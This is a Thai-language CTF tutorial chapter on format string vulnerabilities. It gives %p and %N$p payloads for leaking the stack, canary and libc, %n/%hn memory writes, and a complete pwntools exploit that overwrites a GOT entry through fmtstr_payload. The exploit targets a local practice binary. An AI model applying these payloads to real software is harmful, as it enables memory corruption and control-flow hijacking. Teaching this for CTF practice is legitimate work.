# บท 9 — Format String

ช่องโหว่คนละแบบกับ overflow แต่ทรงพลังมาก — leak ได้ **และ** เขียน
memory ได้ในช่องโหว่เดียว

## ต้นตอของช่องโหว่

`printf` ใช้ format specifier (`%d`, `%s`, `%x`, ...) เพื่อจัดรูปแบบ output
ปัญหาเกิดเมื่อ programmer เอา **user input มาเป็น format string ตรงๆ**

```c
char buf[128];
fgets(buf, 128, stdin);

printf(buf);            // ← ช่องโหว่! ควรเป็น printf("%s", buf)
```

ถ้าเราพิมพ์ `%x %x %x` เข้าไป printf จะพยายามอ่าน argument (ที่ไม่มี
จริง) จาก register และ stack แล้ว print ค่าที่ไม่ควรเห็นออกมา

## ทดสอบว่ามีช่องโหว่ไหม

```
input:  AAAA %p %p %p %p %p %p
output: AAAA 0x7fff... 0x1 0x... 0x41414141 ...
                                    ↑ นี่คือ "AAAA" ของเราบน stack!
```

ถ้าเห็นค่าจาก stack ออกมา = มีช่องโหว่ format string แน่นอน

## ความสามารถที่ 1: LEAK (อ่าน memory)

### leak ค่าบน stack ด้วย %p

```python
p.sendline(b'%p ' * 20)      # print 20 ค่าจาก stack
```

### เจาะจงตำแหน่งด้วย %N$p

`%N$p` = print argument ตัวที่ N โดยตรง (ไม่ต้องไล่ทีละตัว)

```python
p.sendline(b'%6$p')          # print argument ตัวที่ 6
```

### หา offset ของ input เราเอง

พิมพ์ marker แล้วหาว่ามันโผล่ที่ตำแหน่งไหน:

```python
p.sendline(b'AAAAAAAA %p %p %p %p %p %p %p %p')
# ดู output ว่า 0x4141414141414141 อยู่ตำแหน่งที่เท่าไหร่
# สมมติอยู่ตำแหน่งที่ 6 → offset ของเรา = 6
```

### leak address สำคัญ (เช่น libc, canary, PIE base)

```python
# leak canary (มักอยู่ตำแหน่งที่คำนวณได้)
p.sendlineafter(b'> ', b'%15$p')
canary = int(p.recvline().strip(), 16)
log.info(f'canary: {hex(canary)}')

# leak libc address จาก stack (หาตำแหน่งที่มี address libc)
p.sendlineafter(b'> ', b'%21$p')
leak = int(p.recvline().strip(), 16)
libc.address = leak - offset_ที่หาได้
```

## ความสามารถที่ 2: WRITE (เขียน memory)

`%n` = เขียนจำนวนตัวอักษรที่ print ไปแล้ว ลงใน address ที่ argument ชี้

```
%n     → เขียน 4 ไบต์ (int)
%hn    → เขียน 2 ไบต์ (short)
%hhn   → เขียน 1 ไบต์ (char)
```

หลักการ: print ตัวอักษรให้ครบ **จำนวนที่ต้องการเขียน** แล้วใช้ `%n`
เขียนลงเป้าหมาย

```
อยากเขียนเลข 100 ลง address X:
→ print 100 ตัวอักษร แล้ว %n ที่ชี้ไป X
→ ใช้ %100c ช่วย print (print 100 ตัว)
```

### ให้ pwntools ทำ format string write ให้ (แนะนำ)

การคำนวณ `%n` write เองซับซ้อน ให้ pwntools จัดการ:

```python
from pwn import *

# offset = ตำแหน่งที่ input เราเริ่มบน stack (หาจากขั้นตอนก่อนหน้า)
payload = fmtstr_payload(6, {elf.got['exit']: elf.symbols['win']})
#                        ↑offset  ↑เขียนที่ไหน   ↑เขียนค่าอะไร

p.sendline(payload)
# ผลลัพธ์: เมื่อโปรแกรมเรียก exit() มันจะกระโดดไป win() แทน
```

`fmtstr_payload(offset, {target: value})` สร้าง payload ให้อัตโนมัติ —
เขียน `value` ลงที่ `target` โดยไม่ต้องคำนวณ `%n` เอง

## Exploit ตัวอย่างเต็ม: GOT overwrite ผ่าน format string

```python
from pwn import *
context.binary = elf = ELF('./fmt')
p = process('./fmt')

# ขั้นที่ 1: หา offset ของ input เรา
# (ทำครั้งเดียว ด้วยการส่ง AAAA %p %p... แล้วดู)
offset = 6

# ขั้นที่ 2: เขียน GOT ของ puts ให้ชี้ไป win
payload = fmtstr_payload(offset, {elf.got['puts']: elf.symbols['win']})
p.sendlineafter(b'> ', payload)

# เมื่อโปรแกรมเรียก puts() ครั้งถัดไป → กระโดดไป win() แทน
p.interactive()
```

## สรุป: format string ทำอะไรได้บ้าง

| ต้องการ | ใช้ |
|---------|-----|
| อ่าน stack | `%p` หรือ `%N$p` |
| leak canary | `%N$p` ตำแหน่งที่ canary อยู่ |
| leak libc/PIE | `%N$p` ตำแหน่งที่มี address นั้น |
| หา offset input | ส่ง `AAAA %p %p...` แล้วดูว่า 0x4141 อยู่ไหน |
| เขียน memory | `%n` / `fmtstr_payload()` |
| GOT overwrite | `fmtstr_payload(offset, {got: target})` |

## กับดัก

- **offset ต้องแม่น** — ผิดตำแหน่งเดียว leak/write พลาดหมด
- **%n ปิดใน libc บางเวอร์ชัน** (FORTIFY) — จะ crash แทนที่จะเขียน
- **เขียนค่าใหญ่ๆ ช้า** — ถ้าเขียนทีละ 4 ไบต์อาจ print ล้านตัว ให้ใช้
  `%hn` (2 ไบต์) แบ่งเขียนทีละส่วน (fmtstr_payload ทำให้แล้ว)

---

## สรุปบทนี้

- format string เกิดจาก `printf(user_input)` ตรงๆ
- **leak:** `%p`, `%N$p` — อ่าน stack, canary, libc
- **write:** `%n` — เขียน memory
- ให้ `fmtstr_payload(offset, {target: value})` ทำ write ให้อัตโนมัติ
- ขั้นแรกเสมอ: หา offset ของ input ตัวเอง

โจทย์ฝึก: picoCTF **Format string 0/1/2**, HTB format string challenges

บทต่อไป: GOT Overwrite (เจาะลึกกลไก) →
